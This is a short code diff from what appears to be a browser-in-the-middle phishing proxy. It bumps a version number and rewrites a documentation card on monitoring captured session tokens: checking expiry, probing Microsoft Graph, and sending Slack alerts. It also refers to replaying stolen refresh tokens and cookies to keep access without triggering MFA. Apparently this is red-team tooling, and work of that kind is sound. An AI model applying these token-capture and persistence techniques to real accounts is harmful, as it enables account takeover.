@@ -43,7 +43,7 @@ from backend.routes import capture as capture_routes
 credentials_store = JsonStore("credentials")
 cookies_store = JsonStore("cookies")
 
-app = FastAPI(title="BITM Proxy Debug", version="1.47.1")
+app = FastAPI(title="BITM Proxy Debug", version="1.47.2")
 
 app.add_middleware(APIKeyMiddleware)
 app.include_router(browser_routes.router, prefix="/api/browser", tags=["browser"])
@@ -6011,12 +6011,12 @@ curl -sI http://127.0.0.1:8080/</pre>
   </div>
 
   <div class="attack-card">
-    <h3><a href="#" onclick="return docsGoTab('keepalive-log')">10. Token keepalive / persistence</a><span class="portal-arrow">→ Keep-Alive tab</span></h3>
-    <p class="attack-goal">Goal: show a captured refresh token being silently exercised on a schedule to stay valid well past normal expiry, without re-triggering CA/MFA.</p>
+    <h3><a href="#" onclick="return docsGoTab('keepalive-log')">10. Token keep-alive monitor</a><span class="portal-arrow">→ Keep-Alive tab</span></h3>
+    <p class="attack-goal">Goal: know at a glance which captured sessions are still usable — a background watchdog re-checks each captured token so one doesn't silently expire or get revoked mid-engagement. (Actually <i>extending</i> access past expiry is attack #9, replaying the captured refresh/cookies through the proxy.)</p>
     <ol>
-      <li>Open the <b>Keep-Alive</b> tab and enable keepalive for a captured session (Settings → Keep-Alive subtab has the interval).</li>
-      <li>Watch the Keep-Alive log for periodic refresh entries.</li>
-      <li>Revisit the site hours later using the same captured session/cookies — it should still be authenticated.</li>
+      <li>Open the <b>Keep-Alive</b> tab and enable it for a captured session (Settings → Keep-Alive subtab sets <code>keepalive_interval_minutes</code>, default 5).</li>
+      <li>Each cycle decodes the token and checks its <code>exp</code> locally (silent); if <code>enable_token_testing</code> is on it also probes Microsoft Graph <code>/me</code> to confirm the token is still live — that probe writes an Azure AD sign-in log entry, so it's the loud option.</li>
+      <li>Watch the Keep-Alive log for per-token valid / expiring / revoked status; with Slack enabled, a token going stale pings the keepalive channel so you find out immediately, not when a request fails.</li>
     </ol>
   </div>
 
